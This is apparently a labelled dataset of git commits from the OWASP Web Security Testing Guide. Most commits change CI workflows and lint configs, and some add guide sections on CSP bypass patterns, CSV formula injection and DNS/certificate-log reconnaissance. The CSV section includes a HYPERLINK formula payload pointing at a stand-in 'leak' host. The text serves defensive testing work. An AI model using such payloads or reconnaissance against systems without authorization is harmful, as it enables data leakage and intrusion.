[
  {
    "hash": "39ca8267224094522b2525407cd68f3f60b63e43",
    "message": "Bump the dependencies group with 2 updates (#1347)",
    "files": [
      ".github/workflows/build-ebooks.yml",
      ".github/workflows/comment.yml",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+        uses: actions/download-artifact@70fc10c6e5e1ce46ad2ea6f2b72d43f7d47b13c3 # v8.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0\n+      uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0",
    "label": 0
  },
  {
    "hash": "2968306791810502d31a20818ec05ba6b74cd53d",
    "message": "Cache npm global installs for linters (#1346)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+    - name: Save PR Number\n+    - name: Cache npm Global\n+      uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3\n+      with:\n+        path: ~/.npm\n+        key: ${{ runner.os }}-npm-global-markdown-link-check\n+    - name: Install Dependencies\n+    - name: PR Link Check\n+    - name: Repository Link Check\n+    - name: Show Broken Links\n+    - name: Create Artifact for Comment\n+    - name: Upload List of Broken Links\n+    - name: Upload PR Number on Success\n+    - name: Save PR Number\n+    - name: Cache npm Global\n+      uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3\n+      with:\n+        path: ~/.npm\n+        key: ${{ runner.os }}-npm-global-markdownlint-cli2\n+    - name: Install Dependencies\n+    - name: Run Linter\n+    - name: Create Artifact for Comment\n+    - name: Upload List of Issues\n+    - name: Upload PR Number on Success\n+    - name: Save PR Number\n+    - name: Cache npm Global\n+      uses: actions/cache@cdf6c1fa76f9f475f3d7449005a359c84ca0f306 # v5.0.3\n+      with:\n+        path: ~/.npm\n+        key: ${{ runner.os }}-npm-global-textlint\n+    - name: Install Dependencies\n+    - name: Create Artifact for Comment\n+    - name: Upload List of Mistakes\n+    - name: Upload PR Number on Success",
    "label": 0
  },
  {
    "hash": "635c5c7e3ad7766a2c73f1999f84f27ff2ce7d7a",
    "message": "WSTG-CONF-12: Modernize Content Security Policy Testing Methodology (#1344)",
    "files": [
      "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+Testing for Content Security Policy (CSP) weaknesses requires more than verifying the presence of the header. The tester should evaluate whether the policy meaningfully reduces the attack surface and is properly enforced.\n+### Identify and Confirm CSP Enforcement\n+\n+- Inspect HTTP responses for the presence of the `Content-Security-Policy` header.\n+- Check for `Content-Security-Policy-Report-Only`. If only Report-Only is present, the policy is not enforced.\n+- Verify whether CSP is delivered via HTTP header or `<meta>` tag (HTTP headers are preferred).\n+- Note that CSP delivered via `<meta>` tags does not support certain directives such as `frame-ancestors`, `report-uri`, `report-to`, or `sandbox`.\n+- Confirm that the policy is consistently applied across sensitive endpoints.\n+\n+### Review High-Risk Directives\n+\n+Inspect the policy for insecure or overly permissive directives:\n+\n+- `unsafe-inline` allows inline scripts or styles and significantly weakens XSS protections.\n+- `unsafe-eval` permits dynamic code evaluation (`eval()`), increasing bypass risk.\n+- `unsafe-hashes` may allow inline execution if hashes are predictable or improperly scoped.\n+- Wildcard (`*`) sources may allow loading resources from any origin.\n+    - Partial wildcards such as `https://*` or `*.cdn.com` should be carefully evaluated.\n+    - Determine whether allowlisted domains host JSONP endpoints or user-controlled content.\n+- Absence or misuse of `frame-ancestors` may expose the application to clickjacking.\n+- Missing `object-src`, `base-uri`, or restrictive `default-src` directives may weaken policy effectiveness.\n+- Review usage of `require-trusted-types-for` and `trusted-types`. In high-risk applications, absence of Trusted Types may leave DOM-based injection sinks exposed. If `trusted-types` policies are defined, ensure they are not overly permissive.\n+- Check for duplicate directives or conflicting policy definitions that may result in unintended enforcement behavior.\n+\n+### Validate Nonce and strict-dynamic Usage\n+\n+If the policy uses nonces:\n+\n+- Confirm that nonces are cryptographically random.\n+- Verify that nonces are regenerated per response and not reused.\n+- Ensure that legacy inline script patterns are not inadvertently trusted.\n+\n+If `strict-dynamic` is used:\n+\n+- Understand that trust propagates from nonce- or hash-based scripts.\n+- Confirm that no unsafe trust chain allows attacker-controlled script loading.\n+\n+### Evaluate CSP Reporting Mechanisms\n+\n+If `report-uri` or `report-to` is configured:\n+\n+- Verify that reporting endpoints are reachable and functional.\n+- Determine whether sensitive information is exposed in reports.\n+- Confirm that reporting does not create new injection or denial-of-service vectors.\n+\n+### Attempt Controlled Bypass Techniques\n+\n+Where appropriate and authorized, attempt to validate enforcement by testing controlled payloads:\n+\n+- Inline script injection attempts.\n+- Data URL\u2013based payloads.\n+- JSONP callback manipulation from allowlisted domains.\n+- DOM-based gadget chaining using trusted script sources.\n+\n+Successful execution of injected JavaScript indicates CSP misconfiguration or ineffective enforcement.\n+\n+### Assess Policy Strength\n+\n+Business-critical applications should aim to implement a strict policy. A robust CSP typically:\n+\n+- Avoids `unsafe-inline` and `unsafe-eval`.\n+- Uses nonce- or hash-based script controls.\n+- Restricts object embedding (`object-src 'none'`).\n+- Restricts base tag manipulation (`base-uri 'none'`).\n+- Restricts framing using `frame-ancestors`.\n+\n+### Common CSP Bypass Patterns\n+\n+Even when CSP is present, misconfigurations or design weaknesses may allow bypass. Testers should consider the following common patterns:\n+\n+#### JSONP and Trusted Third-Party Endpoints\n+\n+If a CSP allowlists third-party domains (e.g., CDNs), determine whether those domains expose JSONP endpoints or user-controlled content. Attackers may leverage callback injection to execute arbitrary JavaScript while still complying with the policy.\n+\n+#### Wildcard and Broad Source Policies\n+\n+Policies that rely on wildcards (`*`, `https://*`, `*.example.com`) significantly expand the trust boundary. Subdomain takeovers or compromised third-party services may enable bypass within the allowed scope.\n+\n+#### Nonce Reuse or Predictable Nonces\n+\n+If nonces are reused across requests or generated predictably, attackers may reuse or guess them to execute injected scripts. Each response should generate a fresh, cryptographically strong nonce.\n+\n+#### Over-Reliance on strict-dynamic\n+\n+While `strict-dynamic` improves nonce-based policies, trust propagates from trusted scripts. If a trusted script loads attacker-controlled resources, the protection may be weakened.\n+\n+#### Missing Defense-in-Depth Directives\n+\n+Absence of directives such as:\n+\n+- `object-src 'none'`\n+- `base-uri 'none'`\n+- `frame-ancestors`\n+\n+may leave the application exposed to object injection, base tag manipulation, or clickjack",
    "label": 1
  },
  {
    "hash": "c4d9f32ca70111d63daae2c154e66716a9f628aa",
    "message": "Adjust Textlint",
    "files": [
      ".github/configs/.textlintrc",
      ".github/configs/.textlintrc.json",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "json",
      "textlintrc",
      "yml"
    ],
    "added_lines": "+{\n+  \"rules\": {\n+    \"terminology\": {\n+      // Do not load default terms (see terms.json in the tool's repository)\n+      \"defaultTerms\": false,\n+      // Syntax elements to skip. Overrides the default\n+      \"skip\": [\n+        \"Link\",\n+        \"LinkReference\",\n+        \"Blockquote\"\n+      ],\n+      // List of terms\n+      \"terms\": [\n+        // Brands/Products\n+        \"Airbnb\",\n+        \"Android\",\n+        \"AppleScript\",\n+        \"AppVeyor\",\n+        \"AVA\",\n+        \"BrowserStack\",\n+        \"Browsersync\",\n+        \"Codecov\",\n+        \"CodePen\",\n+        \"CodeSandbox\",\n+        \"curl\",\n+        \"DefinitelyTyped\",\n+        \"EditorConfig\",\n+        \"ESLint\",\n+        \"GitHub\",\n+        \"GraphQL\",\n+        \"GraphiQL\",\n+        \"iOS\",\n+        \"JavaScript\",\n+        \"JetBrains\",\n+        \"jQuery\",\n+        \"LinkedIn\",\n+        \"Lodash\",\n+        \"Nmap\",\n+        \"MacBook\",\n+        \"Markdown\",\n+        \"Nginx\",\n+        \"OpenType\",\n+        \"PayPal\",\n+        \"PhpStorm\",\n+        \"RubyMine\",\n+        \"SemVer\",\n+        \"TypeScript\",\n+        \"UglifyJS\",\n+        \"Wasm\",\n+        \"WebAssembly\",\n+        \"WebStorm\",\n+        \"Wikipedia\",\n+        \"WordPress\",\n+        \"YouTube\",\n+        [\n+          \"Open Web Application Security Project\",\n+          \"Open Worldwide Application Security Project\"\n+        ],\n+        [\n+          \"StackOverflow\",\n+          \"Stack Overflow\"\n+        ],\n+        [\n+          \"styled ?components\",\n+          \"styled-components\"\n+        ],\n+        [\n+          \"HTTP[ /]2(?:\\\\.0)?\",\n+          \"HTTP/2\"\n+        ],\n+        [\n+          \"OS X\",\n+          \"macOS\"\n+        ],\n+        [\n+          \"Mac ?OS\",\n+          \"macOS\"\n+        ],\n+        [\n+          \"a npm\",\n+          \"an npm\"\n+        ],\n+\n+        // Abbreviations\n+        \"3D\",\n+        [\n+          \"3-D\",\n+          \"3D\"\n+        ],\n+        \"AJAX\",\n+        \"API\",\n+        [\n+          \"API['\u2019]?s\",\n+          \"APIs\"\n+        ],\n+        \"CSS\",\n+        \"GIF\",\n+        \"HTML\",\n+        \"HTTPS\",\n+        \"IoT\",\n+        \"I/O\",\n+        [\n+          \"I-O\",\n+          \"I/O\"\n+        ],\n+        \"JPEG\",\n+        \"MIME\",\n+        \"OK\",\n+        \"PaaS\",\n+        \"PDF\",\n+        \"PNG\",\n+        \"SaaS\",\n+        \"URL\",\n+        [\n+          \"URL['\u2019]?s\",\n+          \"URLs\"\n+        ],\n+        [\n+          \"an URL\",\n+          \"a URL\"\n+        ],\n+        [\n+          \"wi[- ]?fi\",\n+          \"Wi-Fi\"\n+        ],\n+\n+        // Words and phrases\n+        \"ID\",\n+        \"JavaScript\",\n+        // https://stackoverflow.com/questions/1151338/id-or-id-on-user-interface\n+        [\n+          \"id['\u2019]s\",\n+          \"IDs\"\n+        ],\n+        [\n+          \"backwards compatible\",\n+          \"backward compatible\"\n+        ],\n+        [\n+          \"behaviour(s)?\",\n+          \"behavior$1\"\n+        ],\n+        [\n+          \"build system(s)?\",\n+          \"build tool$1\"\n+        ],\n+        [\n+          \"client side|clientside\",\n+          \"client-side\"\n+        ],\n+        [\n+          \"CLI tool(s)?\",\n+          \"command-line tool$1\"\n+        ],\n+        [\n+          \"he or she\",\n+          \"they\"\n+        ],\n+        [\n+          \"he/she\",\n+          \"they\"\n+        ],\n+        [\n+          \"\\\\(s\\\\)he\",\n+          \"they\"\n+        ],\n+        [\n+          \"his/her\",\n+          \"their\"\n+        ],\n+        [\n+          \"his or her\",\n+          \"their\"\n+        ],\n+        [\n+          \"organisation(s|'s)?\",\n+          \"organization$1\"\n+        ],\n+        [\n+          \"repo\\\\b\",\n+          \"repository\"\n+        ],\n+        [\n+          \"server side|serverside\",\n+          \"server-side\"\n+        ],\n+        [\n+          \"smartphone(s)?\",\n+          \"mobile phone$1\"\n+        ],\n+        // https://stackoverflow.com/questions/44934828/is-it-spread-syntax-or-the-spread-operator\n+        [\n+          \"spread operator\",\n+          \"spread syntax\"\n+        ],\n+        [\n+          \"re-direct(ing|ed)?\",\n+          \"redirect$1\"\n+        ],\n+        [\n+          \"black[- ]?list(?:ed|ing)?\",\n+          \"deny list(s), or re-write as applicable\"\n+        ],\n+        [\n+          \"white[- ]?list(?:ed|ing)?\",\n+          \"allow list(s), or re-write as applicable\"\n+        ],\n+\n+        // Single word\n+        [\n+          \"auto[- ]complete\",\n+          \"autocomplete\"\n+        ],\n+        [\n+          \"auto[- ]format\",\n+          \"autoformat\"\n+        ],\n+        [\n+          \"auto[- ]fix\",\n+          \"autofix\"\n+        ],\n+        [\n+          \"auto[- ]fixing\",\n+          \"autofixing\"\n+        ],\n+        [\n+          \"bug[- ]fix(es)?\",\n+          \"bugfix$1\"\n+        ],\n+        [\n+          \"change[- ]log(s)?\",\n+          \"changelog$1\"\n+        ],\n+        [\n+          \"check[- ]-box(es)?\",\n+          \"checkbox$1\"\n+        ],\n+        [\n+          \"code[- ]base(es)?\",\n+          \"codebase$1\"\n+        ],\n+        [\n+          \"co[- ]locate(d?)\",\n+          \"colocate$1\"\n+        ],\n+        [\n+          \"end[- ]point(s)?\",\n+          \"endpoint$1\"\n+        ],\n+",
    "label": 0
  },
  {
    "hash": "17d4f377d6d24d172de503406dad9d1f8f4fbf12",
    "message": "Publish Latest checklists 2026-02-22 (#1343)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: a687e98d03649ea14e61d9febe49142eaa14594012207f0213b7facf6267dcde\n+                ,{\n+                \"name\":\"Testing for CSV Injection\",\n+                \"id\":\"WSTG-INPV-21\",\n+                \"reference\":\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection\",\n+                \"objectives\":[\n+                    \"Identify CSV/spreadsheet export features that include untrusted input.\",\n+                    \"Verify whether attacker-controlled values are interpreted as formulas when the export is opened in common spreadsheet applications.\",\n+                    \"Check whether separator/quote injection can move a dangerous prefix to the start of a cell.\",\n+                    \"Validate whether mitigations remain effective in Microsoft Excel after saving and re-opening the CSV.\",\n+                    \"Assess practical impact based on who opens the export and how it is used.\"\n+                  ]\n+                }",
    "label": 0
  },
  {
    "hash": "6dd90d0aaee3e3ea225e93644ebd4c898bb898c0",
    "message": "docs: add new test section for CSV Injection (WSTG-INPV-21) (#1305)",
    "files": [
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection.md",
      "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md",
      "document/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+# Testing for CSV Injection\n+\n+|ID          |\n+|------------|\n+|WSTG-INPV-21|\n+\n+## Summary\n+\n+CSV Injection (also known as Formula Injection) occurs when an application embeds untrusted, user-controlled input into CSV (or other spreadsheet-compatible) exports and the resulting file is opened in a spreadsheet program (e.g., Microsoft Excel, LibreOffice Calc). Spreadsheet applications may interpret certain cell values as formulas, which can lead to security issues such as user deception (phishing-style workflows), manipulation of spreadsheet output, or data exfiltration. In some environments, formula injection can be escalated to higher impact via spreadsheet \u201cgadgets\u201d and legacy features (e.g., DDE / Dynamic Data Exchange behaviors), potentially reaching command execution on the workstation that opens the file\u2014typically dependent on client configuration and/or user interaction.\n+\n+A key characteristic of this issue is that the vulnerability often manifests only when the exported file is opened by a user (e.g., an administrator, finance, or support) in a spreadsheet application.\n+\n+## Test Objectives\n+\n+- Identify CSV/spreadsheet export features that include untrusted input.\n+- Verify whether attacker-controlled values are interpreted as formulas when the export is opened in common spreadsheet applications.\n+- Check whether separator/quote injection can move a dangerous prefix to the start of a cell.\n+- Validate whether mitigations remain effective in Microsoft Excel after saving and re-opening the CSV.\n+- Assess practical impact based on who opens the export and how it is used.\n+\n+## How to Test\n+\n+### Formula-Triggering Prefixes\n+\n+Cells beginning with the following characters may be interpreted as formulas by spreadsheet software:\n+\n+- Equals (`=`)\n+- Plus (`+`)\n+- Minus (`-`)\n+- At (`@`)\n+- Tab (`0x09`)\n+- Carriage return (`0x0D`)\n+- Line feed (`0x0A`)\n+- Full-width (double-byte) variants such as `\uff1d`, `\uff0b`, `\uff0d`, `\uff20` (depending on locale/application behavior)\n+\n+> Important (Excel behavior): Microsoft Excel may remove quotes or escape characters from CSV cells when a file is saved and re-opened. As a result, some commonly suggested mitigations can fail after save/reopen and previously escaped formulas may become active again.\n+\n+Also note that it is not sufficient to ensure the *overall* untrusted input does not start with a dangerous character. Attackers may inject separators and quoting to start a new cell, placing the dangerous character at the beginning of a cell.\n+\n+### Identify CSV Export Functionality and Data Sources\n+\n+Locate features that generate CSV/TSV or \u201cexport to spreadsheet\u201d content:\n+\n+- Reports (users, transactions, audit logs, tickets)\n+- Admin dashboards exporting lists\n+- Email attachments generated by the application\n+- Scheduled exports / integrations\n+\n+Identify untrusted data sources that can end up in the export:\n+\n+- User profiles (name, email, company)\n+- Free-text fields (comments, ticket subjects, notes)\n+- Imported/integrated external data (webhooks, CRM sync, partner feeds)\n+\n+Document which roles can trigger the export and which roles are likely to open it.\n+\n+### Place Benign, Detectable Formula-Like Values into Candidate Fields\n+\n+Use harmless payloads to detect formula evaluation (avoid payloads that execute commands or perform uncontrolled network access).\n+Test values that begin with each formula-triggering character:\n+\n+- `=1+1`\n+- `+1+1`\n+- `-1+1`\n+- `@SUM(1,1)`\n+- `=HYPERLINK(\"http://example.invalid/leak?test=1\", \"Click Me\")`\n+\n+Notes:\n+\n+- The `HYPERLINK()` case is useful to demonstrate realistic impact (deception/phishing-style flows, or potential metadata exposure when a link is clicked/opened). Use a controlled endpoint during testing (e.g., a local listener or an internal test host).\n+- Do not use external \u201creal attacker\u201d infrastructure in validation.\n+\n+Also test control-character and Unicode variants (where input handling allows it):\n+\n+- A value that begins with a tab character followed by `=1+1` (TAB + `=1+1`)\n+- Full-width prefix variants (e.g., `\uff1d1+1`)\n+\n+### Test Separator and Quote \u201cCell Breakout\u201d Scenarios\n+\n+Because CSV is cell-based, test whether you can inject content that starts a new cell and then begins with a dangerous character. This depends on:\n+\n+- Field separator (commonly `,` or `;`)\n+- Quoting rules and escaping\n+- Application-side CSV generation and encoding\n+\n+Example *benign* test patterns (adjust separator to the actual export format):\n+\n+- A value containing a quote and separator intended to create a new cell, then `=1+1`\n+- A value containing a separator directly (if not quoted by the exporter), then `=1+1`\n+\n+Your objective is to see whether the resulting CSV contains any cell whose first character is one of the formula-triggering prefixes. Verify this by inspecting the raw CSV output in a text editor.\n+\n+### Export and Verify in Spreadsheet Applications\n+\n+- Export/download the CSV.\n+- Open it in at least one spreadsheet applicat",
    "label": 1
  },
  {
    "hash": "27ca4ac181eaa7e52556701bd8181f5373a97fe7",
    "message": "Add Himasree Kolathur to WSTG contributors (#1340)",
    "files": [
      "document/1-Frontispiece/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- Himasree Kolathur\n+- Omar Jezi",
    "label": 0
  },
  {
    "hash": "f81f6f230c09c1b448f178e89a47d5b87d5488e7",
    "message": "Publish Latest checklists 2026-02-18 (#1339)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: f0584ab1b470acedfa3349f409ef61b3f39aa5917fd90c31b383aecb8577e3ff\n+                \"name\":\"Attack Surface Identification\",\n+                \"reference\":\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Attack_Surface_Identification\",\n+                    \"Enumerate all web applications within scope.\",\n+                    \"Identify DNS names, domains, and virtual hosts associated with the target.\",\n+                    \"Discover additional domains and subdomains using passive and active DNS techniques.\",\n+                    \"Analyze digital certificates and Certificate Transparency logs for additional hostnames.\"",
    "label": 0
  },
  {
    "hash": "fbaef87f7b1a2a73618362f585f69850326ec383",
    "message": "Enhance WSTG-INFO-04 with DNS Enumeration and CT Log Testing (#1332)",
    "files": [
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Attack_Surface_Identification.md",
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/README.md",
      "document/4-Web_Application_Security_Testing/01-Information_Gathering/images/Figure-4.1.4-CT-logs-example.png",
      "document/README.md"
    ],
    "extensions": [
      "png",
      "md"
    ],
    "added_lines": "+# Attack Surface Identification\n+Identifying the attack surface of a web application involves discovering all applications, domains, virtual hosts, and externally exposed services associated with the target infrastructure. This process extends beyond identifying hosted applications and includes DNS enumeration, subdomain discovery, virtual host analysis, non-standard ports, and the review of digital certificates and Certificate Transparency logs.\n+\n+With the proliferation of virtual hosting and shared infrastructure, the traditional 1:1 relationship between an IP address and a web server has largely disappeared. A single IP address may host multiple applications across different domains, environments, or administrative interfaces. Failing to identify these assets can result in incomplete assessments and overlooked vulnerabilities.\n+To address these issues, a comprehensive attack surface identification process must be performed.\n+- Enumerate all web applications within scope.\n+- Identify DNS names, domains, and virtual hosts associated with the target.\n+- Discover additional domains and subdomains using passive and active DNS techniques.\n+- Analyze digital certificates and Certificate Transparency logs for additional hostnames.\n+#### DNS Enumeration\n+\n+DNS enumeration aims to identify domains, subdomains, and related DNS records associated with the target organization to expand the assessment scope. DNS enumeration plays a key role in identifying additional virtual hosts mapped to the same IP address. This may reveal development systems, staging environments, legacy services, or administrative interfaces.\n+\n+Both passive and active techniques can be used.\n+\n+#### Passive DNS Enumeration\n+\n+Passive techniques do not directly interact with the target infrastructure and instead rely on publicly available data sources. Examples include:\n+\n+- Public DNS records (A, AAAA, MX, TXT, NS)\n+- Reverse DNS lookups (PTR records)\n+- Search engines\n+- Passive DNS databases\n+- Certificate Transparency logs\n+\n+Passive techniques are preferred during early reconnaissance phases to avoid detection.\n+\n+#### Active DNS Enumeration\n+\n+Active techniques directly query the target's DNS infrastructure and may generate logs on the target systems. These include:\n+\n+- Subdomain brute forcing\n+- DNS zone transfer attempts\n+- DNS record enumeration using tools\n+\n+Common tools used for DNS enumeration include:\n+\n+- `amass`\n+- `subfinder`\n+- `dnsrecon`\n+- `fierce`\n+- `dig`\n+- `nslookup`\n+\n+Example using `dig`: `dig example.com ANY`\n+\n+#### Certificate Transparency Logs\n+\n+Certificate Transparency (CT) logs are publicly accessible records of issued TLS certificates. These logs can be searched to identify hostnames and subdomains associated with a target organization, including staging systems, administrative interfaces, legacy systems, or other externally reachable services.\n+\n+Reviewing CT logs may reveal hostnames that are not directly discoverable through DNS zone transfers, reverse lookups, or search engine queries alone. Testers should extract discovered hostnames and validate them through DNS resolution to determine whether they are active and within the defined scope of the assessment.\n+\n+When reviewing CT log data, consider:\n+\n+- Hostnames indicating development, staging, or testing environments.\n+- Administrative or management interfaces.\n+- Deprecated or legacy systems that may still be accessible.\n+- Wildcard certificates that may imply additional undiscovered subdomains.\n+\n+Information gathered from CT logs should be validated to confirm ownership and relevance before further testing.\n+\n+Care must be taken to respect scope limitations defined in the engagement.\n+\n+Discovered assets should be validated and documented before further testing activities.\n+\n+One common approach to querying CT logs is to use publicly available search portals that aggregate certificate data. For example, a tester may search for certificates issued to `example.com` and review the listed subdomains.\n+\n+For instance: `https://crt.sh/?q=%25.example.com`\n+\n+![CT Log Search Example](images/Figure-4.1.4-CT-logs-example.png)  \n+\n+*Figure 4.1.4-1: Example of Certificate Transparency log search results.*\n+\n+The results may list subdomains such as `dev.example.com`, `staging.example.com`, or other hostnames that are not directly referenced from the primary site. Discovered hostnames should be validated through DNS resolution before further testing.\n+\n+- DNS lookup tools such as `nslookup`, `dig`, and `host`\n+- Subdomain enumeration tools such as `amass`, `subfinder`, `dnsrecon`, and `fierce`\n+- Search engines (Google, Bing, and other major search engines)\n+- Reverse IP lookup services\n+- [Nikto](https://github.com/sullo/nikto)\n+4.1.4 [Attack Surface Identification](04-Attack_Surface_Identification.md)\n+#### 4.1.4 [Attack Surface Identification](4-Web_Application_Security_Testing/01-Information_Gathering/04-Attack_Surface_Identification.md)",
    "label": 1
  },
  {
    "hash": "bfb72cde6b8933995834320bdeba5c812bfa4aa8",
    "message": "Fix link check (#1338)",
    "files": [
      ".github/workflows/README.md",
      ".github/workflows/md-link-check.yml"
    ],
    "extensions": [
      "md",
      "yml"
    ],
    "added_lines": "+- Uses inline `git diff` from `pr/` (no third-party action) to list changed files between the base ref and HEAD, excluding deleted files and paths under `.github/`\n+- Copies **all** changed files (including images and other assets) from `pr/` into `base/` so link targets exist, then runs the link checker only on changed `.md` files so relative links resolve correctly\n+        # Get list of changed .md files (excluding .github/) for link checking\n+        CHANGED_ALL=$(git diff --name-only --diff-filter=d origin/${{ github.base_ref }}...HEAD | grep -v '^\\.github/' || true)\n+        FILES=$(echo \"$CHANGED_ALL\" | grep '\\.md$' || true)\n+        ALL_SPACE_SEPARATED=$(echo \"$CHANGED_ALL\" | tr '\\n' ' ' | xargs)\n+        echo \"all_changed=$ALL_SPACE_SEPARATED\" >> $GITHUB_OUTPUT\n+        ALL_CHANGED: '${{ steps.files.outputs.all_changed }}'\n+        # Copy all changed files (md + images etc.) from pr/ to base/ so link targets exist when we check .md files\n+        for FILE in $ALL_CHANGED; do\n+          [ -z \"$FILE\" ] && continue\n+          mkdir -p \"base/$(dirname \"$FILE\")\"\n+          cp \"pr/$FILE\" \"base/$FILE\"\n+        # Check only .md files in base/ where relative links can be resolved",
    "label": 0
  },
  {
    "hash": "4a3cdd10650a44779b69515f8cd484bd9b86a94b",
    "message": "Include changed files in summary (#1337)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        echo \"## Changed files\" >> $GITHUB_STEP_SUMMARY\n+        echo \"$FILES\" >> $GITHUB_STEP_SUMMARY\n+        echo \"## Changed files\" >> $GITHUB_STEP_SUMMARY\n+        echo \"$FILES\" >> $GITHUB_STEP_SUMMARY\n+        echo \"## Changed files\" >> $GITHUB_STEP_SUMMARY\n+        echo \"$FILES\" >> $GITHUB_STEP_SUMMARY",
    "label": 0
  },
  {
    "hash": "60ff95dc94e06718019b1c2106a10c227b1c6252",
    "message": "Explicit checkout destination (#1336)",
    "files": [
      ".github/workflows/README.md",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "md",
      "yml"
    ],
    "added_lines": "+- Checks out the **base branch** into `base/` and the **PR head** into `pr/` (each checkout uses an explicit path so neither overwrites the other)\n+- Uses inline `git diff` from `pr/` (no third-party action) to list changed `.md` files between the base ref and HEAD, excluding deleted files and paths under `.github/`\n+- Copies only those changed files from `pr/` into `base/`, then runs the link checker so relative links resolve correctly\n+- Checks out the **base branch** into `base/` and the **PR head** into `pr/` (each checkout uses an explicit path so neither overwrites the other)\n+- Uses inline `git diff` from `pr/` to list changed `.md` files (excluding deleted files and `.github/`), then runs `markdownlint-cli2` only on those files under `pr/`\n+- Checks out the **base branch** into `base/` and the **PR head** into `pr/` (each checkout uses an explicit path so neither overwrites the other)\n+- Uses inline `git diff` from `pr/` to list changed `.md` files (excluding deleted files and `.github/`), then runs textlint only on those files under `pr/`\n+        path: pr\n+      working-directory: pr\n+        # Copy changed files from pr/ to base/ to check them with correct relative link resolution\n+            cp \"pr/$FILE\" \"base/$FILE\"\n+        path: pr\n+      working-directory: pr\n+          if [ -f \"pr/$FILE\" ]; then\n+            OUTPUT=\"$(markdownlint-cli2 \"pr/$FILE\" --config base/.github/configs/.markdownlint.json 2>&1)\" || STATUS=$?\n+        path: pr\n+      working-directory: pr\n+        for FILE in $FILES; do echo \"$FILE\" | grep -v \\.github && textlint --config base/.github/configs/.textlintrc --fix --rule terminology \"pr/$FILE\" | tee -a log.txt; done",
    "label": 0
  },
  {
    "hash": "085aa54ed1468a9b53bd7d04cac18589b7e1896d",
    "message": "Adjust Fetch Depth (#1335)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        fetch-depth: 0\n+        fetch-depth: 0\n+        fetch-depth: 0",
    "label": 0
  },
  {
    "hash": "99c3994a0a9ecfe1c4f9da6011230b54570949b1",
    "message": "Fix Linter Checkouts (#1334)",
    "files": [
      ".github/workflows/README.md",
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "md",
      "yml"
    ],
    "added_lines": "+This workflow:\n+- Checks out the **base branch** into `base/` (used for config and for relative link resolution)\n+- Checks out the **PR head** into the workspace root (for the \"Get Changed Files\" step and as the source of changed content)\n+- Uses inline `git diff` (no third-party action) to list changed `.md` files between the base ref and HEAD, excluding deleted files and paths under `.github/`\n+- Copies only those changed files from the workspace into `base/`, then runs the link checker so relative links resolve correctly\n+- Config and scripts are always taken from `base/` (the base branch), not from the PR\n+- Checks out the **base branch** into `base/` (used for config and for `format_lint_output.py`)\n+- Checks out the **PR head** into the workspace root\n+- Uses inline `git diff` to list changed `.md` files (excluding deleted files and `.github/`), then runs `markdownlint-cli2` only on those files\n+- Uses `format_lint_output.py` from `base/.github/workflows/scripts/` to format output for PR comments\n+- Config and scripts are always taken from `base/` (the base branch), not from the PR\n+This workflow:\n+- Checks out the **base branch** into `base/` (used for config)\n+- Checks out the **PR head** into the workspace root\n+- Uses inline `git diff` to list changed `.md` files (excluding deleted files and `.github/`), then runs textlint only on those files\n+- Config is always taken from `base/` (the base branch), not from the PR\n+        ref: ${{ github.base_ref || 'master' }}\n+    - name: Checkout PR\n+      if: github.event_name == 'pull_request'\n+      uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6\n+      with:\n+        ref: ${{ github.event.pull_request.head.sha }}\n+        # Copy changed files from workspace (PR checkout) to base/ to check them with correct relative link resolution\n+            cp \"$FILE\" \"base/$FILE\"\n+        ref: ${{ github.base_ref || 'master' 